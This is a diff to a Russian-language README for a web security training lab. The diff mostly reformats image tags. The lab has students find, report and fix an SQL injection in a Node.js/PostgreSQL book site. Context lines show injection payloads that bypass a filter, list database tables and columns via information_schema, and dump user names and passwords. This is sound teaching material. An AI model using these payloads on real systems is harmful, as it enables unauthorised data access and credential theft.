@@ -33,9 +33,13 @@ psql -U postgres -d lib
   <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.1.png" />
 </p>
 
-<center>![Picture 3.2](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.2.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.2.png" />
+</p>
 
-<center>![Picture 3.3](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.3.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/3.3.png" />
+</p>
 
 4. Установить nodejs версии 14.
 
@@ -44,8 +48,9 @@ psql -U postgres -d lib
 ```bash
 npm install
 ```
-
-<center>![Picture 5](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/5.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/5.png" />
+</p>
 
 6. Запустить сайт через Visual Studio Code или через команду:
 
@@ -53,17 +58,23 @@ npm install
 npm start
 ```
 
-<center>![Picture 6](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/6.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/6.png" />
+</p>
 
 7. Войти на сайт и увидеть список книг и авторов.
  
-<center>![Picture 7](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/7.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/7.png" />
+</p>
     
 8. Обнаружить sql инъекцию.
 
 Используем в качестве пейлоада одинарную кавычку и получаем ошибку и весь SQL запрос.
 
-<center>![Picture 8](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/8.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/8.png" />
+</p>
 
 9. Написать отчёт с описанием найденной уязвимости и примерами её эксплуатации. В отчете приветси информацию об: обходе установленного фильтра, получении данных из другой таблицы, похищении пароля пользователя.
 
@@ -73,7 +84,9 @@ npm start
 %' or 1 = 1 --
 ```
 
-<center>![Picture 9.1](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.1.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.1.png" />
+</p>
 
 Получим схему БД для определения таблиц с помощью пейлоада:
 
@@ -81,7 +94,9 @@ npm start
 %' union select null, table_schema, table_name from information_schema.tables --
 ```
 
-<center>![Picture 9.2](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.2.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.2.png" />
+</p>
 
 Из вывода можно найти информацию от том, что есть таблица public.users. С помощью следующего запроса определим какие столбцы есть в БД и их тип:
 
@@ -90,7 +105,9 @@ npm start
 %' union select null, column_name,data_type  from information_schema.columns  where table_name = 'users'; --
 ```
 
-<center>![Picture 9.3](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.3.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.3.png" />
+</p>
 
 Посмотрим записи таблицы public.users с помощью запроса:
 
@@ -98,7 +115,9 @@ npm start
 %' union select null, name, pass  from public.users; --
 ```
 
-<center>![Picture 9.4](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.4.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/9.4.png" />
+</p>
  
 10. Исправить уязвимость. В отчёте привести пример того, что уязвимости больше не эксплуатируются.
  
@@ -113,7 +132,9 @@ if(bookname){
     }
 ```
 
-<center>![Picture 10](https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/10.png)</center>
+<p align="center">
+  <img src="https://github.com/gk-j2/DevSecWeb/blob/main/ex02/pictures/10.png" />
+</p>
 
 
 P.S.
